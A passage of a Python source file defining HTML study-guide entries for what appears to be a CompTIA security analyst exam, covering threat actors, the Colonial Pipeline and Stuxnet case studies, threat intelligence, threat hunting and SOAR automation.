<tr><td>Hacktivist</td><td>Ideology, publicity</td><td>Low to moderate</td><td>Defacement, DDoS, leaks with a message</td></tr>
<tr><td>Script kiddie</td><td>Curiosity, bragging</td><td>Low; others&rsquo; tools</td><td>Noisy, opportunistic scans and public exploits</td></tr>
<tr><td>Insider: intentional</td><td>Revenge, money</td><td>Has legitimate access</td><td>Access misuse, data hoarding before leaving</td></tr>
<tr><td>Insider: unintentional</td><td>None (mistake)</td><td>Has legitimate access</td><td>Misconfiguration, falling for phishing, mis-sent data</td></tr>
<tr><td>Supply chain</td><td>Reach many victims through one vendor</td><td>Varies, often high</td><td>Compromised updates, libraries, MSPs</td></tr></table></div>
<p><strong>APT</strong> describes the behavior (advanced, persistent, a threat with intent). Many APT groups are nation-states, but the terms are not identical.</p>
""" + T.format("An unintentional insider is still an insider threat. A well-meaning employee who emails a spreadsheet of customer data to the wrong address belongs in this row, not &ldquo;no threat&rdquo;.")),

dict(id="colonial", o="1.4", t="Case study: Colonial Pipeline (2021)", q="ransomware", h="""
<p>A worked example the class uses, which touches several objectives at once.</p>
<ul><li><strong>Actor</strong>: DarkSide, a criminal group running <strong>ransomware-as-a-service</strong> (RaaS): developers rent the ransomware to affiliates and take a share of the payments. Organized crime, motivated by money (1.4).</li>
<li><strong>Initial access</strong>: a legacy VPN account protected only by a password, with <strong>no MFA</strong>. The password had been exposed in an earlier breach, a reminder of the cost of password reuse (1.1, 1.3).</li>
<li><strong>Actions</strong>: roughly 100 GB of data stolen before encryption (double extortion), then ransomware across the IT network.</li>
<li><strong>Response</strong>: the company shut down the <strong>OT</strong> pipeline operations as a precaution even though the ransomware hit IT, because it couldn&rsquo;t be sure of the boundary between them. It brought in an outside IR firm and notified the FBI and CISA, and paid about $4.4 million in bitcoin. The US Department of Justice later recovered about $2.3 million of it (3.2, 4.2).</li>
<li><strong>Impact</strong>: the attack began on May 7, 2021; operations restarted on May 12, 2021, with fuel shortages and panic buying across the Southeast. (One class slide gives the restart year as 2022. It was 2021.)</li></ul>
<p><strong>Lessons</strong>: MFA on every remote-access path, disable dormant accounts, segment IT from OT, have tested IR and BC plans, and treat leaked-credential intelligence as urgent.</p>
"""),

dict(id="stuxnet", o="1.4", t="Case study: Stuxnet (discovered 2010)", q="stuxnet", h="""
<p>The other worked example the class uses, and the standard illustration of an attack on OT.</p>
<ul><li><strong>Target</strong>: the uranium enrichment centrifuges at Natanz, Iran, which were run by <strong>Siemens S7 PLCs</strong> programmed with Step 7 software. The goal was physical damage made to look like equipment failure.</li>
<li><strong>Actor</strong>: widely attributed to a nation-state operation. It is the textbook <strong>APT</strong>: well funded, patient and narrowly targeted.</li>
<li><strong>Delivery</strong>: the plant network was air-gapped, so the attackers first infected <strong>contractor companies</strong> that installed industrial control systems and let infected staff carry the worm in. It spread on <strong>USB drives</strong>, across local networks through a <strong>print spooler zero-day</strong>, and through infected Step 7 project files. Several zero-days were used in all.</li>
<li><strong>Discovery</strong>: inspectors noticed centrifuges failing at an unusual rate in early 2010. Later that year a security firm in Belarus, called in to look at Iranian PCs that kept crashing, found the malicious files.</li></ul>
<p><strong>Lessons</strong>: an air gap is not a guarantee (removable media and the supply chain bridge it), control removable media, monitor OT networks and PLC logic for unexpected change, and assess third-party and contractor risk.</p>
"""),

dict(id="ttp", o="1.4", t="TTPs and the Pyramid of Pain", q="ttp", h="""
<p><strong>Tactics</strong> are the attacker&rsquo;s goals (initial access, persistence, exfiltration). <strong>Techniques</strong> are how they reach a goal (phishing with an attachment, scheduled task). <strong>Procedures</strong> are the specific way one group does it (this macro, this task name, this time of day). MITRE ATT&amp;CK is organized exactly this way: tactics as columns, techniques beneath.</p>
<p><strong>Why TTPs beat IOCs</strong> (the Pyramid of Pain idea): blocking a hash or an IP costs the attacker seconds to change. Detecting a technique, like credential dumping from LSASS, forces them to change how they operate, which is expensive.</p>
<p>From least to most painful for an attacker to change: hash values, IP addresses, domain names, network/host artifacts, tools, TTPs.</p>
""" + T.format("When a question asks which intelligence has the longest useful life or hurts the adversary most, choose TTPs over hashes or IP addresses.")),

dict(id="confidence", o="1.4", t="Intelligence confidence: timeliness, relevancy, accuracy", q="confidence", h="""
<p>Intelligence is only worth acting on if you can trust it. CompTIA names three tests:</p>
<ul><li><strong>Timeliness</strong>: is it still current? An IP that hosted C2 last year may now be a clean cloud customer. Indicators age fast; TTPs age slowly.</li>
<li><strong>Relevancy</strong>: does it apply to you? A feed about attacks on SCADA systems matters little to a company with no OT. Filter by your industry, region and technology.</li>
<li><strong>Accuracy</strong>: is it correct? Has the source been right before, is it corroborated by other sources, how many false positives does it produce?</li></ul>
<p>Analysts express the result as a confidence level (often low, moderate, high) so readers know how much weight to put on it.</p>
""" + T.format("Old but accurate intelligence fails on timeliness, not accuracy. Read which of the three the scenario actually breaks.")),

dict(id="collection-sources", o="1.4", t="Collection methods and sources", q="isac", h="""
<div class="tblwrap"><table><tr><th>Open source (OSINT)</th><th>Closed source</th></tr>
<tr><td>Social media, blogs and forums, vendor research write-ups</td><td>Paid commercial feeds (vetted, enriched, supported)</td></tr>
<tr><td>Government bulletins (CISA advisories, FBI notices)</td><td>Information sharing organizations: <strong>ISACs</strong> per sector (FS-ISAC for finance, H-ISAC for health), ISAOs</td></tr>
<tr><td><strong>CERT</strong> and <strong>CSIRT</strong> publications (national CERTs, US-CERT advisories)</td><td>Internal sources: your own SIEM, incident history, honeypots, ticketing</td></tr>
<tr><td>Deep and dark web monitoring (leaked credentials, access for sale)</td><td></td></tr></table></div>
<p><strong>Internal sources</strong> are often the most relevant intelligence you have: attacks that already hit you are the ones most likely to come back.</p>
<p>Sharing formats: <strong>STIX</strong> describes threat information in a structured way (indicators, actors, campaigns, relationships); <strong>TAXII</strong> is the protocol that transports STIX between systems. The <strong>Traffic Light Protocol</strong> (TLP) marks how widely shared intelligence may be passed on: RED (named recipients only), AMBER (and AMBER+STRICT), GREEN (community), CLEAR (public).</p>
<p>Commercial intelligence platforms combine many of these sources with analysis and search, for example Google Threat Intelligence (which builds on VirusTotal and Mandiant research) or Recorded Future. Named products are general knowledge; the exam tests the source types.</p>
""" + T.format("ISACs are closed, membership-based sharing communities, even though members share freely within them. Don&rsquo;t file them under open source.")),

dict(id="ti-lifecycle", o="1.4", t="Threat intelligence lifecycle and types", q="threat intelligence", h="""
<p><strong>Threat intelligence</strong> is threat data that has been collected, processed and analyzed until it explains an adversary&rsquo;s motives, targets and methods well enough to drive a decision. Raw feeds are data; intelligence is what you can act on.</p>
<p><strong>The lifecycle</strong> (an iterative loop):</p>
<ol><li><strong>Planning and direction</strong>: stakeholders state what they need to know (&ldquo;is this new ransomware strain a threat to us?&rdquo;).</li>
<li><strong>Collection</strong>: gather raw data from feeds, OSINT, ISACs, dark web monitoring and internal logs.</li>
<li><strong>Processing</strong>: normalize, deduplicate, translate and structure it.</li>
<li><strong>Analysis</strong>: turn it into findings with a stated confidence level.</li>
<li><strong>Dissemination</strong>: deliver it in the right form to each audience.</li>
<li><strong>Feedback</strong>: consumers say what helped, which sets the next round of requirements.</li></ol>
<div class="tblwrap"><table><tr><th>Type</th><th>Audience</th><th>Content</th><th>Shelf life</th></tr>
<tr><td><strong>Strategic</strong></td><td>Executives, risk owners</td><td>Trends, motives, geopolitical and industry risk, in business language</td><td>Long</td></tr>
<tr><td><strong>Operational</strong></td><td>Security leaders, IR and hunt teams</td><td>Specific campaigns and actors: their TTPs, targets and timing</td><td>Medium</td></tr>
<tr><td><strong>Tactical</strong></td><td>SOC analysts, security tools</td><td>Indicators: IPs, domains, hashes, signatures</td><td>Short</td></tr></table></div>
<p>Sources disagree on labels: some add a fourth category, <em>technical</em>, for raw indicators, and the class slides call operational intelligence &ldquo;technical&rdquo;. What matters is the pattern: the higher the audience, the broader and longer-lasting the intelligence.</p>
""" + T.format("Intelligence without requirements is just data. If a scenario has a team drowning in feeds nobody asked for, the missing step is planning and direction, with feedback to tune it.")),

dict(id="intel-sharing", o="1.4", t="Who uses threat intelligence", q="threat intelligence sharing", h="""
<ul><li><strong>Incident response</strong>: attributes and scopes an incident faster; known IOCs show where else to look.</li>
<li><strong>Vulnerability management</strong>: shows which vulnerabilities are being exploited in the wild, so they jump the patch queue.</li>
<li><strong>Risk management</strong>: puts likelihood numbers on threats for the risk register and business decisions.</li>
<li><strong>Security engineering</strong>: shapes architecture and control choices to defeat the TTPs you actually face.</li>
<li><strong>Detection and monitoring</strong>: turns indicators and TTPs into SIEM rules, IDS signatures and EDR detections.</li></ul>
"""),

dict(id="threat-hunting", o="1.4", t="Threat hunting, IoCs, active defense, honeypots", q="threat hunting", h="""
<p><strong>Threat hunting</strong> is proactive: start from a hypothesis (&ldquo;an attacker with this TTP is already inside&rdquo;) and search for evidence, instead of waiting for an alert. It assumes compromise and looks for what the tools missed.</p>
<p><strong>IoC life cycle</strong>: <strong>collection</strong> (gather from feeds, incidents, sandboxes) &rarr; <strong>analysis</strong> (validate, deduplicate, add context, judge confidence) &rarr; <strong>application</strong> (load into SIEM, EDR, firewall and DNS blocks; search history for past hits).</p>
<p><strong>Focus areas</strong> CompTIA lists:</p>
<ul><li><strong>Configurations and misconfigurations</strong>: weak settings attackers exploit, such as open storage buckets or disabled logging.</li>
<li><strong>Isolated networks</strong>: air-gapped or segmented networks get less monitoring, so hunters check them deliberately.</li>
<li><strong>Business-critical assets and processes</strong>: hunt where the damage would be worst, such as domain controllers, payment systems and crown-jewel data.</li></ul>
<p><strong>Active defense</strong> means engaging the attacker inside your own environment to detect, slow or study them: deception, decoys, tarpits. It does not mean &ldquo;hacking back&rdquo; against the attacker&rsquo;s systems, which is generally illegal.</p>
<p><strong>Honeypot</strong>: a decoy system with no legitimate users, so any interaction is suspicious. Variants: honeynet (a network of them), honeyfile, honeytoken (a fake credential or record that alerts when used).</p>
<p><strong>Three ways to start a hunt</strong>:</p>
<ul><li><strong>Hypothesis-driven</strong>: start from a new TTP or intel report (&ldquo;attackers are abusing scheduled tasks for persistence&rdquo;) and test whether it is happening here.</li>
<li><strong>Indicator-driven</strong>: search for known IoCs, and for <strong>indicators of attack (IoAs)</strong>. An IoC is evidence that something already happened (a hash, a C2 IP). An IoA is behavior that shows an attack in progress (credential dumping, lateral movement), whatever tool is used.</li>
<li><strong>Analytics-driven</strong>: baselining and machine learning surface anomalies, which analysts then investigate.</li></ul>
<p><strong>Hunt steps</strong>: <strong>trigger</strong> (a hypothesis or anomaly points to an area) &rarr; <strong>investigation</strong> (dig in with EDR, logs and network data until it is benign or confirmed) &rarr; <strong>resolution</strong> (hand confirmed activity to incident response, and turn what you learned into new automated detections).</p>
<div class="tblwrap"><table><tr><th></th><th>Threat intelligence</th><th>Threat hunting</th></tr>
<tr><td>Purpose</td><td>Understand threats and adversaries</td><td>Find threats already inside</td></tr>
<tr><td>Data</td><td>Mostly external: feeds, reports, dark web, ISACs</td><td>Mostly internal: logs, network traffic, endpoint data</td></tr>
<tr><td>Timing</td><td>Ahead of an attack, to inform defenses</td><td>Ongoing, assuming compromise</td></tr>
<tr><td>Output</td><td>Indicators, profiles, strategic insight</td><td>Confirmed findings, incidents, new detections</td></tr></table></div>
<p>They feed each other: intelligence suggests what to hunt for, and hunts produce new intelligence.</p>
""" + T.format("Threat hunting starts from a hypothesis, not an alert. If the scenario begins with an alert firing, it is incident response or triage, not hunting.")),

# ---------------------------------------------------------------- 1.5
dict(id="standardize", o="1.5", t="Standardize processes and choose what to automate", q="automation", h="""
<p>Automate tasks that are <strong>repeatable</strong>, rule-based and <strong>do not need human judgment</strong>: enriching an alert with WHOIS and reputation data, resetting a password after a confirmed compromise, blocking a hash that a sandbox confirmed malicious, closing known false positives.</p>
<p>Keep humans on decisions with business impact or ambiguity: declaring an incident, shutting down a production system, talking to law enforcement.</p>
<p><strong>Team coordination</strong>: documented runbooks and playbooks so every analyst handles the same alert the same way; clear ownership of each automation so someone maintains it when an API or log format changes.</p>
"""),

dict(id="streamline", o="1.5", t="Streamline operations: SOAR, enrichment, feed combination", q="enrichment", h="""
<ul><li><strong>Automation</strong> performs one task without a person (look up an IP). <strong>Orchestration</strong> chains many automated tasks across different tools into a workflow (look up, sandbox, block, ticket, notify). SOAR does both.</li>
<li><strong>Data enrichment</strong>: add context to a raw alert automatically, such as geolocation, asset owner and criticality, user&rsquo;s department, reputation scores, related past incidents. The analyst starts with the full picture.</li>
<li><strong>Threat feed combination</strong>: merge many feeds, remove duplicates, normalize formats and score confidence so one indicator is not handled five times.</li>
<li><strong>Minimize human engagement</strong>: fewer manual steps means faster response, fewer errors, and less alert fatigue.</li></ul>
"""),

dict(id="integration", o="1.5", t="Tool integration: APIs, webhooks, plugins, single pane of glass", q="webhook", h="""
<div class="tblwrap"><table><tr><th>Method</th><th>Direction</th><th>Example</th></tr>
<tr><td><strong>API</strong></td><td>You call the tool when you want something (pull or push on request)</td><td>SOAR queries the EDR API for a host&rsquo;s processes; REST APIs return JSON</td></tr>
<tr><td><strong>Webhook</strong></td><td>The tool calls you when something happens (event-driven push to a URL)</td><td>SIEM posts to the SOAR endpoint the moment an alert fires</td></tr>
<tr><td><strong>Plugin</strong></td><td>Adds a capability inside an existing tool</td><td>A SIEM app that parses a new log source; a scanner plugin for a new CVE</td></tr></table></div>
<p><strong>Single pane of glass</strong>: one console showing data and actions from many tools, so analysts don&rsquo;t switch between ten screens. It reduces context switching and missed correlations.</p>
""" + T.format("Polling an API every minute versus receiving a webhook when the event happens: the webhook is the event-driven, near-real-time choice.")),
]
